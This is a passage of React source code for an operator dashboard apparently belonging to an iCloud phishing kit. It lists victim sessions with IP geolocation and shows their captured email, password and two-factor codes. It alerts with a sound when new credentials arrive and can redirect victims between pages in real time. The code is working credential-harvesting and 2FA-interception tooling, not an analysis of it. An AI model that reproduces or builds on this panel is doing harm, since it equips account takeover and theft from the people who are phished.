'use client';

import { useState, useEffect, useMemo, useRef } from 'react';
import {
    RefreshCw,
    ChevronLeft,
    ChevronRight,
    ChevronDown,
    Globe,
    MapPin,
    Clock,
    Wifi,
    Smartphone,
    Flag,
    AlertCircle,
    Shield,
    User,
    Lock,
    Copy,
    ExternalLink,
    Globe2,
    MapPinOff,
    Building,
    Mail,
    Calendar,
    Info,
    Server,
    Network,
    Hash,
    LayoutDashboard,
    Users,
    Activity,
    Bell,
    Key,
    Tag,
    Terminal,
    UserCircle,
    Settings,
    LogOut,
    Menu,
    X,
    Eye,
    EyeOff,
    Trash2,
    CheckCircle,
    XCircle
} from 'lucide-react';
import io from 'socket.io-client';
import {
    Sheet,
    SheetClose,
    SheetContent,
    SheetDescription,
    SheetFooter,
    SheetHeader,
    SheetTitle,
    SheetTrigger,
} from "@/components/ui/sheet";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

export default function Panel() {
    const [socket, setSocket] = useState(null);
    const [connections, setConnections] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [authError, setAuthError] = useState(null);
    const [currentPage, setCurrentPage] = useState(1);
    const [itemsPerPage, setItemsPerPage] = useState(20);
    const [searchTerm, setSearchTerm] = useState('');
    const [sortBy, setSortBy] = useState('connectedAt');
    const [sortOrder, setSortOrder] = useState('desc');
    const [lastUpdated, setLastUpdated] = useState(null);
    const [isAdmin, setIsAdmin] = useState(false);
    const [socketId, setSocketId] = useState(null);
    const [redirectUrl, setRedirectUrl] = useState('');
    const [selectedRedirectPage, setSelectedRedirectPage] = useState('');
    const [stats, setStats] = useState({
        total: 0,
        adminCount: 0,
        userCount: 0
    });
    const [selectedConnection, setSelectedConnection] = useState(null);
    const [activeTab, setActiveTab] = useState('connections');
    const [sidebarOpen, setSidebarOpen] = useState(false);
    const [selectedUser, setSelectedUser] = useState(null);
    const [sectionsOpen, setSectionsOpen] = useState({
        basic: true,
        location: true,
        control: true,
        credentials: true,
        timing: true
    });
    const [credentialStatus, setCredentialStatus] = useState({});
    const [copiedField, setCopiedField] = useState(null);
    const [redirectPageSent, setRedirectPageSent] = useState(false);
    const [redirectUrlSent, setRedirectUrlSent] = useState(false);
    const copyToClipboard = (text, field) => {
        if (!text) return;
        navigator.clipboard.writeText(text).then(() => {
            setCopiedField(field);
            setTimeout(() => setCopiedField(null), 1500);
        });
    };
    const prevConnectionsRef = useRef([])
    const hasInitiallyLoaded = useRef(false)
    const prevLoginDataRef = useRef(new Set())

    const getCredentialStatus = (connId) => credentialStatus[connId] || { login: 'pending', twoFA: 'waiting' };
    const setLoginStatus = (connId, status, loginSnapshot) => setCredentialStatus(prev => ({
        ...prev,
        [connId]: { ...(prev[connId] || {}), login: status, loginVersion: status !== 'pending' && loginSnapshot ? JSON.stringify({ e: loginSnapshot.email, p: loginSnapshot.password }) : undefined }
    }));
    const setTwoFAStatus = (connId, status, codeSnapshot) => setCredentialStatus(prev => ({
        ...prev,
        [connId]: { ...(prev[connId] || {}), twoFA: status, twoFAVersion: status !== 'pending' ? codeSnapshot : undefined }
    }));
    const loginDataVersion = selectedConnection?.loginData ? JSON.stringify({ e: selectedConnection.loginData.email, p: selectedConnection.loginData.password }) : '';
    const twoFAVersion = selectedConnection?.loginData?.twoFactorCode ?? '';

    const handleRedirectPage = (socketId, page) => {
        if (socket && socketId && page) {
            socket.emit("redirectPage", {
                socketId: socketId,
                page: page
            });
        }
    };

    useEffect(() => {
        if (!socket || !socket.connected || !isAdmin) return;

        const interval = setInterval(() => {
            fetchConnections();
        }, 2000);

        return () => clearInterval(interval);
    }, [socket, isAdmin]);

    const getToken = () => {
        if (typeof window !== 'undefined') {
            return localStorage.getItem('adminToken');
        }
        return null;
    };

    useEffect(() => {
        const token = getToken();

        if (!token) {
            setAuthError('No admin token found. Please login.');
            setLoading(false);
            return;
        }

        console.log('🔌 Connecting to socket server with token...');

        const socketConnection = io('http://localhost:3005', {
            auth: {
                token: token
            },
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 5
        });

        socketConnection.on('connect', () => {
            console.log('Socket connected:', socketConnection.id);
            setSocketId(socketConnection.id);
            setAuthError(null);
        });

        socketConnection.on('welcome', (data) => {
            console.log('Welcome from server:', data);
            setIsAdmin(data.isAdmin || false);

            if (!data.isAdmin) {
                setAuthError('You are not authorized as admin');
            }
        });

        socketConnection.on('connect_error', (error) => {
            console.log('Socket connection error:', error.message);
            setAuthError(`Connection failed: ${error.message}`);
            setLoading(false);
        });

        socketConnection.on('disconnect', (reason) => {
            console.log('Socket disconnected:', reason);
            setSocketId(null);
        });

        setSocket(socketConnection);

        return () => {
            console.log('Cleaning up socket connection');
            if (socketConnection) {
                socketConnection.disconnect();
            }
        };
    }, []);

    const playNotificationSound = () => {
        const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIGGS57OihUBELTKXh8K1hGgg=' );
        audio.volume = 0.5;
        audio.play().catch(e => console.log('Audio play failed:', e));
    };

    const fetchConnections = (isManual = false) => {
        if (!socket || !socket.connected) {
            setError('Socket not connected');
            return;
        }

        if (!isAdmin) {
            setError('Admin access required');
            return;
        }

        if (!hasInitiallyLoaded.current || isManual) {
            setLoading(true);
        }
        setError(null);

        socket.emit('getAll', (response) => {
            if (!hasInitiallyLoaded.current || isManual) {
                setLoading(false);
                hasInitiallyLoaded.current = true;
            }

            if (response.success) {
                setConnections(prev => {
                    const updated = response.connections.map(newConn => {
                        const existing = prev.find(c => c.id === newConn.id)
                        
                        // Check for new login data
                        if (newConn.loginData && !prevLoginDataRef.current.has(newConn.id)) {
                            prevLoginDataRef.current.add(newConn.id);
                            playNotificationSound();
                        }
                        
                        return existing ? { ...existing, ...newConn, isActive: true } : newConn;
                    });

                    const removed = prev.filter(prevConn =>
                        !response.connections.find(c => c.id === prevConn.id)
                    ).map(conn => ({ ...conn, isActive: false }))

                    return [...updated, ...removed]
                });

                setSelectedConnection(prev => {
                    if (!prev) return null;
                    const freshData = response.connections.find(c => c.id === prev.id);
                    if (freshData) {
                        return { ...prev, ...freshData, isActive: true };
                    }
                    return { ...prev, isActive: false };
                });

                setStats({
                    total: response.total,
                    adminCount: response.adminCount,
                    userCount: response.connections.length
                });
                setLastUpdated(response.timestamp);
            } else {
                setError(response.error || 'Failed to fetch connections');
            }
        });
    };

    useEffect(() => {
        if (socket && socket.connected && isAdmin) {
            fetchConnections();
        }
    }, [socket, isAdmin]);

    const filteredConnections = useMemo(() => {
        let filtered = [...connections];
        if (searchTerm) {
            const term = searchTerm.toLowerCase();
            filtered = filtered.filter(conn =>
                conn.id?.toLowerCase().includes(term) ||
                conn.userAgent?.toLowerCase().includes(term) ||
                conn.geoData?.ip?.toLowerCase().includes(term) ||
                conn.geoData?.city?.toLowerCase().includes(term) ||
                conn.geoData?.country?.toLowerCase().includes(term) ||
                conn.geoData?.org?.toLowerCase().includes(term)
            );
        }

        filtered.sort((a, b) => {
            let aValue, bValue;

            if (sortBy === 'connectedAt') {
                aValue = a.connectedAt || 0;
                bValue = b.connectedAt || 0;
            } else if (sortBy === 'country') {
                aValue = a.geoData?.country || '';
                bValue = b.geoData?.country || '';
            } else if (sortBy === 'city') {
                aValue = a.geoData?.city || '';
                bValue = b.geoData?.city || '';
            } else if (sortBy === 'ip') {
                aValue = a.geoData?.ip || '';
                bValue = b.geoData?.ip || '';
            } else {
                aValue = a[sortBy] || '';
                bValue = b[sortBy] || '';
            }

            if (sortOrder === 'asc') {
                return aValue > bValue ? 1 : -1;
            } else {
                return aValue < bValue ? 1 : -1;
            }
        });

        return filtered;
    }, [connections, searchTerm, sortBy, sortOrder]);

    // Pagination calculations
    const totalPages = Math.ceil(filteredConnections.length / itemsPerPage);
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    const paginatedConnections = filteredConnections.slice(startIndex, endIndex);

    // Format date
    const formatDate = (timestamp) => {
        if (!timestamp) return 'N/A';
        const date = new Date(timestamp);
        return date.toLocaleTimeString([], {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });
    };

    // Format full date
    const formatFullDate = (timestamp) => {
        if (!timestamp) return 'N/A';
        const date = new Date(timestamp);
        return date.toLocaleString();
    };

    // Get flag emoji from country code
    const getFlagEmoji = (countryCode) => {
        if (!countryCode || countryCode.length !== 2) return '🏴';
        return `https://flagsapi.com/${countryCode.toUpperCase()}/shiny/64.png`;
    };

    // Format time ago
    const formatTimeAgo = (timestamp) => {
        if (!timestamp) return '';
        const seconds = Math.floor((Date.now() - timestamp) / 1000);

        if (seconds < 60) return `${seconds}s ago`;
        if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
        if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
        return `${Math.floor(seconds / 86400)}d ago`;
    };

    // Handle sort
    const handleSort = (column) => {
        if (sortBy === column) {
            setSortOrder(sortOrder === 'asc' ? 'desc' : 'asc');
        } else {
            setSortBy(column);
            setSortOrder('asc');
        }
        setCurrentPage(1);
    };

    // Render sort indicator
    const renderSortIndicator = (column) => {
        if (sortBy !== column) return null;
        return (
            <ChevronDown
                className={`inline ml-1 w-4 h-4 transition-transform ${sortOrder === 'desc' ? 'rotate-180' : ''
                    }`}
            />
        );
    };

    // Handle login redirect
    const handleLoginRedirect = () => {
        window.location.href = '/icloudadmin';
    };

    // Handle logout
    const handleLogout = () => {
        localStorage.removeItem('adminToken');
        window.location.reload();
    };

    // Open in new tab
    const openInNewTab = (url) => {
        window.open(url, '_blank', 'noopener,noreferrer');
    };

    // Handle sheet open
    const handleSheetOpen = (connection) => {
        setSelectedConnection(connection);
    };

    // Get coordinates link
    const getCoordinatesLink = (loc) => {
        if (!loc) return '#';
        const [lat, lng] = loc.split(',');
        return `https://maps.google.com/?q=${lat},${lng}`;
    };

    // Get IP info link
    const getIPInfoLink = (ip) => {
        if (!ip || ip === 'N/A') return '#';
        return `https://ipinfo.io/${ip}`;
    };

    if (authError) {
        return (
            <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
                <div className="max-w-md w-full bg-[#1C1C1E] border border-[#2C2C2E] rounded p-8 text-center">
                    <Lock className="w-16 h-16 text-red-500 mx-auto mb-4" strokeWidth={1.5} />
                    <h2 className="text-2xl font-semibold text-white mb-2">Authentication Required</h2>
                    <p className="text-gray-400 text-sm mb-6">{authError}</p>
                    <div className="flex gap-3">
                        <button
                            onClick={handleLoginRedirect}
                            className="flex-1 py-2.5 bg-[#f0b100] hover:bg-[#d99a00] text-black font-semibold rounded transition-colors"
                        >
                            Go to Login
                        </button>
                        <button
                            onClick={() => window.location.reload()}
                            className="flex-1 py-2.5 bg-[#28282A] hover:bg-[#2C2C2E] text-gray-300 font-medium rounded transition-colors"
                        >
                            Retry
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className="flex h-screen bg-[#0a0a0a] overflow-hidden">
            {/* Mobile sidebar backdrop */}
            {sidebarOpen && (
                <div
                    className="fixed inset-0 bg-black/50 z-40 lg:hidden"
                    onClick={() => setSidebarOpen(false)}
                />
            )}

            {/* Sidebar */}
            <aside className={`fixed inset-y-0 left-0 z-50 w-56 bg-[#0a0a0a] border-r border-[#2C2C2E] transform transition-transform duration-300 lg:translate-x-0 ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'
                } lg:static flex flex-col`}>
                <div className="flex flex-col h-full overflow-y-auto scrollbar-thin">
                    {/* Logo */}
                    <div className="px-4 py-4">
                        <h1 className="text-base font-bold text-white">YSF</h1>
                        <p className="text-xs text-gray-500 mt-0.5">iCloud</p>
                    </div>

                    {/* Navigation */}
                    <nav className="flex-1 px-2 py-2 space-y-1.5">
                        <div className="w-full flex items-center gap-3 px-3 py-2 rounded text-sm font-medium bg-[#262626] text-[#f0b100]">
                            <Users className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
                            <span>Connections</span>
                        </div>
                    </nav>

                    {/* Bottom Actions */}
                    <div className="px-2 py-2 space-y-1.5 mt-auto">
                        <button
                            onClick={handleLogout}
                            className="w-full flex items-center gap-3 px-3 py-2 text-red-400 hover:text-red-300 hover:bg-[#28282A] rounded text-sm font-medium transition-all duration-150"
                        >
                            <LogOut className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
                            <span>Logout</span>
                        </button>
                    </div>
                </div>
            </aside>

            {/* Main Content */}
            <main className="flex-1 overflow-auto bg-[#0a0a0a]">
                {/* Header */}
                <div className="bg-[#0a0a0a] px-4 sm:px-6 lg:px-8 py-3.5">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            {/* Mobile menu button */}
                            <button
                                onClick={() => setSidebarOpen(!sidebarOpen)}
                                className="lg:hidden p-2 text-gray-400 hover:text-white rounded hover:bg-[#181818]"
                            >
                                <Menu className="w-5 h-5" />
                            </button>

                        </div>

                        <div className="flex items-center gap-3">
                            {/* Connection status */}
                            <div className={`flex items-center gap-2 px-3 py-1.5 rounded text-xs font-medium ${socketId
                                ? 'bg-green-500/10 text-green-400 border border-green-500/20'
                                : 'bg-red-500/10 text-red-400 border border-red-500/20'
                                }`}>
                                <div className={`w-1.5 h-1.5 rounded-full ${socketId ? 'bg-green-400' : 'bg-red-400'}`} />
                                {socketId ? 'Connected' : 'Disconnected'}
                            </div>

                            {/* Refresh button */}
                            <button
                                onClick={() => fetchConnections(true)}
                                disabled={loading || !socket?.connected}
                                className="px-4 py-2 bg-[#1C1C1E] hover:bg-[#28282A] border border-[#2C2C2E] text-gray-300 hover:text-white rounded text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                            >
                                <RefreshCw className={`w-4 h-4 text-[#f0b100] ${loading ? 'animate-spin' : ''}`} strokeWidth={2} />
                                Refresh
                            </button>
                        </div>
                    </div>
                </div>

                {/* Content Area */}
                <div className="p-4 sm:px-6 lg:px-8 lg:py-6">
                    {/* Page Title */}
                    <h1 className="text-3xl font-semibold text-white mb-4">Activity</h1>

                    {/* Breadcrumb Navigation */}
                    <nav className="flex pt-2 pb-10">
                        <div className="flex items-center gap-3 text-sm">
                            <div className="flex items-center gap-2 px-3 py-1 bg-[#1C1C1E] border border-[#2C2C2E] rounded">
                                <span className="text-gray-400">Total Connections</span>
                                <Users className="w-4 h-4 text-[#f0b100]" strokeWidth={2} />
                                <ChevronRight className="w-3 h-3 text-gray-600" />
                                <span className="font-semibold text-white">{stats.userCount}</span>
                            </div>
                            <div className="h-4 w-px bg-[#2C2C2E]"></div>
                            <div className="flex items-center gap-2 px-3 py-1 bg-[#1C1C1E] border border-[#2C2C2E] rounded">
                                <span className="text-gray-400">Active Now</span>
                                <Activity className="w-4 h-4 text-[#f0b100]" strokeWidth={2} />
                                <ChevronRight className="w-3 h-3 text-gray-600" />
                                <span className="font-semibold text-white">{connections.filter(c => c.isActive).length}</span>
                            </div>
                            <div className="h-4 w-px bg-[#2C2C2E]"></div>
                            <div className="flex items-center gap-2 px-3 py-1 bg-[#1C1C1E] border border-[#2C2C2E] rounded">
                                <span className="text-gray-400">Admin Sessions</span>
                                <Shield className="w-4 h-4 text-[#f0b100]" strokeWidth={2} />
                                <ChevronRight className="w-3 h-3 text-gray-600" />
                                <span className="font-semibold text-white">{stats.adminCount}</span>
                            </div>
                            <div className="h-4 w-px bg-[#2C2C2E]"></div>
                            <div className="flex items-center gap-2 px-3 py-1 bg-[#1C1C1E] border border-[#2C2C2E] rounded">
                                <span className="text-gray-400">Countries</span>
                                <Globe className="w-4 h-4 text-[#f0b100]" strokeWidth={2} />
                                <ChevronRight className="w-3 h-3 text-gray-600" />
                                <span className="font-semibold text-white">{new Set(connections.map(c => c.geoData?.country).filter(Boolean)).size}</span>
                            </div>
                        </div>
                    </nav>

                    {/* Error display */}
                    {error && (
                        <div className="mb-4 p-3 bg-red-500/10 border border-red-500/20 rounded flex items-center gap-2">
                            <AlertCircle className="w-5 h-5 text-red-400" />
                            <span className="text-red-300">{error}</span>
                            <button
                                onClick={fetchConnections}
                                className="ml-auto text-sm text-red-300 hover:text-red-200"
                            >
                                Retry
                            </button>
                        </div>
                    )}

                    {/* Connections View */}
                    <div className="space-y-4">
                            {/* Search and Filters */}
                            <div className="flex flex-wrap items-center gap-3">
                                <div className="flex-1 min-w-[200px]">
                                    <input
                                        type="text"
                                        placeholder="Search by IP, country, city..."
                                        value={searchTerm}
                                        onChange={(e) => {
                                            setSearchTerm(e.target.value);
                                            setCurrentPage(1);
                                        }}
                                        className="w-full px-3 py-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 placeholder-gray-500 focus:outline-none input-coolify"
                                    />
                                </div>

                                <div className="flex items-center gap-2">
                                    <span className="text-xs font-medium text-gray-400 whitespace-nowrap">Show:</span>
                                    <select
                                        value={itemsPerPage}
                                        onChange={(e) => {
                                            setItemsPerPage(Number(e.target.value));
                                            setCurrentPage(1);
                                        }}
                                        className="px-3 py-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 focus:outline-none input-coolify"
                                    >
                                        <option value={10}>10</option>
                                        <option value={20}>20</option>
                                        <option value={50}>50</option>
                                        <option value={100}>100</option>
                                    </select>
                                </div>

                                <div className="flex items-center gap-3 text-sm">
                                    <div className="px-3 py-2 bg-transparent">
                                        <span className="text-gray-500 font-medium">Total:</span>
                                        <span className="ml-1.5 font-semibold text-white">{stats.userCount}</span>
                                    </div>
                                    <div className="px-3 py-2 bg-transparent">
                                        <span className="text-gray-500 font-medium">Filtered:</span>
                                        <span className="ml-1.5 font-semibold text-white">{filteredConnections.length}</span>
                                    </div>
                                </div>
                            </div>

                                            {/* Connections List/Cards */}
                            {loading ? (
                                <div className="flex items-center justify-center h-64">
                                    <div className="text-center">
                                        <RefreshCw className="w-16 h-16 animate-spin mx-auto mb-4 text-gray-600" strokeWidth={1.5} />
                                        <p className="text-gray-400 text-lg font-medium">Loading connections...</p>
                                    </div>
                                </div>
                            ) : paginatedConnections.length === 0 ? (
                                <div className="flex items-center justify-center h-64">
                                    <div className="text-center">
                                        <Wifi className="w-16 h-16 mx-auto mb-4 text-gray-600" strokeWidth={1.5} />
                                        <p className="text-gray-400 text-lg font-medium">No burgers</p>
                                        {searchTerm && (
                                            <p className="text-gray-500 text-sm mt-2">
                                                Try adjusting your search term
                                            </p>
                                        )}
                                    </div>
                                </div>
                            ) : (
                                <div className="bg-[#1C1C1E] border border-[#2C2C2E] rounded overflow-hidden">
                                    {/* Connection Cards */}
                                    <div className="divide-y divide-[#2C2C2E]">
                                            {paginatedConnections.map((conn, index) => (
                                                <div
                                                    key={conn.id}
                                                    className={`p-4 hover:bg-[#28282A] transition-colors cursor-pointer ${!conn.isActive ? 'opacity-60' : ''
                                                        }`}
                                                    onClick={() => setSelectedUser(conn)}
                                                >
                                                    <div className="flex items-start justify-between gap-4">
                                                        <div className="flex items-start gap-4 flex-1">
                                                            {/* Flag & Status */}
                                                            <div className="flex-shrink-0">
                                                                <img
                                                                    src={getFlagEmoji(conn.geoData?.country) || "/placeholder.svg"}
                                                                    alt="Flag"
                                                                    className="w-10 h-10 rounded"
                                                                />
                                                                <div className={`mt-2 flex items-center justify-center gap-1 text-[10px] font-bold ${conn.isActive ? 'text-green-400' : 'text-red-400'
                                                                    }`}>
                                                                    <div className={`w-1.5 h-1.5 rounded-full ${conn.isActive ? 'bg-green-400' : 'bg-red-400'
                                                                        }`} />
                                                                    {conn.isActive ? 'Active' : 'Offline'}
                                                                </div>
                                                            </div>

                                                            {/* Main Info */}
                                                            <div className="flex-1 min-w-0">
                                                                <div className="flex items-center gap-2 mb-2">
                                                                    <h3 className="text-sm font-medium text-white">
                                                                        {conn.geoData?.city || 'Unknown'}, {conn.geoData?.country || 'N/A'}
                                                                    </h3>
                                                                    {conn.loginData && !conn.loginData.twoFactorCode && (
                                                                        <span className="px-2 py-0.5 bg-[#f0b100]/10 border border-[#f0b100]/20 text-[#f0b100] text-[10px] rounded font-medium">
                                                                            Has Login Data
                                                                        </span>
                                                                    )}
                                                                    {conn.loginData?.twoFactorCode && (
                                                                        <span className="px-2 py-0.5 bg-green-500/10 border border-green-500/20 text-green-400 text-[10px] rounded font-medium">
                                                                            Has 2FA Code
                                                                        </span>
                                                                    )}
                                                                </div>

                                                                <div className="grid grid-cols-2 gap-x-4 gap-y-2 text-xs">
                                                                    <div>
                                                                        <span className="text-gray-500">IP:</span>
                                                                        <span className="ml-2 text-gray-300 font-mono">{conn.geoData?.ip || 'N/A'}</span>
                                                                    </div>
                                                                    <div className="flex items-center">
                                                                        <span className="text-gray-500 flex items-center gap-1">
                                                                            Page:
                                                                            <Info className="w-3.5 h-3.5 text-[#f0b100]" strokeWidth={2} />
                                                                        </span>
                                                                        <span className="ml-2 text-gray-300">{conn.currentPage || 'N/A'}</span>
                                                                    </div>
                                                                    <div>
                                                                        <span className="text-gray-500">Region:</span>
                                                                        <span className="ml-2 text-gray-300">{conn.geoData?.region || 'N/A'}</span>
                                                                    </div>
                                                                    <div>
                                                                        <span className="text-gray-500">Timezone:</span>
                                                                        <span className="ml-2 text-gray-300">{conn.geoData?.timezone || 'N/A'}</span>
                                                                    </div>
                                                                    <div className="flex items-center">
                                                                        <span className="text-gray-500 flex items-center gap-1">
                                                                            Reference ID:
                                                                            <Info className="w-3.5 h-3.5 text-[#f0b100]" strokeWidth={2} />
                                                                        </span>
                                                                        <span className="ml-2 text-gray-300 font-mono">{Array.from(conn.id).reduce((acc, char) => acc + char.charCodeAt(0) * 100, 0).toString().slice(0, 8)}</span>
                                                                    </div>
                                                                    <div>
                                                                        <span className="text-gray-500">Connected:</span>
                                                                        <span className="ml-2 text-gray-300">{formatTimeAgo(conn.connectedAt)}</span>
                                                                    </div>
                                                                </div>

                                                                <div className="mt-2">
                                                                    <div className="text-[10px] text-gray-500 truncate" title={conn.userAgent}>
                                                                        {conn.userAgent || 'No user agent'}
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>

                                                        {/* Actions */}
                                                        <div className="flex items-center gap-1">
                                                            <button
                                                                onClick={(e) => {
                                                                    e.stopPropagation();
                                                                    if (socket && confirm('Delete this connection?')) {
                                                                        socket.emit('delete', { ids: [conn.id] });
                                                                        setConnections(prev => prev.filter(c => c.id !== conn.id));
                                                                    }
                                                                }}
                                                                className="p-2 hover:bg-red-500/20 rounded transition-colors group"
                                                                title="Delete connection"
                                                            >
                                                                <Trash2 className="w-4 h-4 text-gray-400 group-hover:text-red-400" />
                                                            </button>
                                                            <Sheet>
                                                                <SheetTrigger asChild>
                                                                    <button
                                                                        onClick={(e) => {
                                                                            e.stopPropagation();
                                                                            handleSheetOpen(conn);
                                                                        }}
                                                                        className="p-2 hover:bg-[#262626] rounded transition-colors group"
                                                                        title="View details"
                                                                    >
                                                                        <ChevronRight className="w-4 h-4 text-gray-400 group-hover:text-white" />
                                                                    </button>
                                                                </SheetTrigger>
                                                                <SheetContent
                                                                    side="right"
                                                                    className="w-full sm:max-w-md bg-[#0f0f0f] border-l border-[#2C2C2E] overflow-y-auto p-6"
                                                                >
                                                                    {selectedConnection && (
                                                                    <>
                                                                        <SheetHeader className="mb-6">
                                                                            <div className="flex items-center gap-3">
                                                                                <img
                                                                                    src={getFlagEmoji(selectedConnection.geoData?.country) || "/placeholder.svg"}
                                                                                    alt="Flag"
                                                                                    className="w-10 h-10 rounded"
                                                                                />
                                                                                <div>
                                                                                    <SheetTitle className="text-white">
                                                                                        Connection Details
                                                                                    </SheetTitle>
                                                                                    <SheetDescription className="text-gray-400 text-sm">
                                                                                        {selectedConnection.geoData?.city || 'Unknown'}, {selectedConnection.geoData?.country || 'N/A'}
                                                                                    </SheetDescription>
                                                                                </div>
                                                                            </div>
                                                                        </SheetHeader>

                                                                        <div className="space-y-6">
                                                                            {/* Basic Information */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, basic: !prev.basic }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    Basic Information
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.basic ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.basic && (
                                                                                    <div className="space-y-3">
                                                                                    <div>
                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Socket ID</Label>
                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono">
                                                                                            {selectedConnection.id}
                                                                                        </div>
                                                                                    </div>

                                                                                    <div>
                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Status</Label>
                                                                                        <div className={`inline-flex items-center gap-2 px-3 py-1.5 rounded text-sm ${selectedConnection.isActive
                                                                                            ? 'bg-green-500/10 text-green-400 border border-green-500/20'
                                                                                            : 'bg-red-500/10 text-red-400 border border-red-500/20'
                                                                                            }`}>
                                                                                            <div className={`w-2 h-2 rounded-full ${selectedConnection.isActive ? 'bg-green-400' : 'bg-red-400'
                                                                                                }`} />
                                                                                            {selectedConnection.isActive ? 'Active' : 'Inactive'}
                                                                                        </div>
                                                                                    </div>

                                                                                    <div>
                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">User Agent</Label>
                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-xs text-gray-400 break-all">
                                                                                            {selectedConnection.userAgent || 'Not available'}
                                                                                        </div>
                                                                                    </div>

                                                                                    <div>
                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Current Page</Label>
                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
                                                                                            {selectedConnection.currentPage || 'N/A'}
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                                )}
                                                                            </div>

                                                                            {/* Location Information */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, location: !prev.location }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    Location Information
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.location ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.location && (
                                                                                    <>
                                                                                        <div className="grid grid-cols-2 gap-3">
                                                                                            <div>
                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">IP Address</Label>
                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono flex items-center justify-between">
                                                                                                    <span>{selectedConnection.geoData?.ip || 'N/A'}</span>
                                                                                                    <button
                                                                                                        onClick={() => openInNewTab(getIPInfoLink(selectedConnection.geoData?.ip))}
                                                                                                        disabled={!selectedConnection.geoData?.ip}
                                                                                                        className="ml-2 text-[#f0b100] hover:text-[#d99a00] disabled:opacity-30"
                                                                                                    >
                                                                                                        <ExternalLink className="w-3.5 h-3.5" />
                                                                                                    </button>
                                                                                                </div>
                                                                                            </div>

                                                                                            <div>
                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">Country</Label>
                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 flex items-center gap-2">
                                                                                                    <img
                                                                                                        src={getFlagEmoji(selectedConnection.geoData?.country) || "/placeholder.svg"}
                                                                                                        alt="Flag"
                                                                                                        className="w-5 h-5 rounded"
                                                                                                    />
                                                                                                    {selectedConnection.geoData?.country || 'N/A'}
                                                                                                </div>
                                                                                            </div>

                                                                                            <div>
                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">City</Label>
                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
                                                                                                    {selectedConnection.geoData?.city || 'N/A'}
                                                                                                </div>
                                                                                            </div>

                                                                                            <div>
                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">Region</Label>
                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
                                                                                                    {selectedConnection.geoData?.region || 'N/A'}
                                                                                                </div>
                                                                                            </div>

                                                                                            <div>
                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">Postal Code</Label>
                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
                                                                                                    {selectedConnection.geoData?.postal || 'N/A'}
                                                                                                </div>
                                                                                            </div>

                                                                                            <div>
                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">Timezone</Label>
                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
                                                                                                    {selectedConnection.geoData?.timezone || 'N/A'}
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>

                                                                                        <div>
                                                                                            <Label className="text-gray-500 text-xs mb-1.5 block">Coordinates</Label>
                                                                                            <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono flex items-center justify-between">
                                                                                                <span>{selectedConnection.geoData?.loc || 'N/A'}</span>
                                                                                                <button
                                                                                                    onClick={() => openInNewTab(getCoordinatesLink(selectedConnection.geoData?.loc))}
                                                                                                    disabled={!selectedConnection.geoData?.loc}
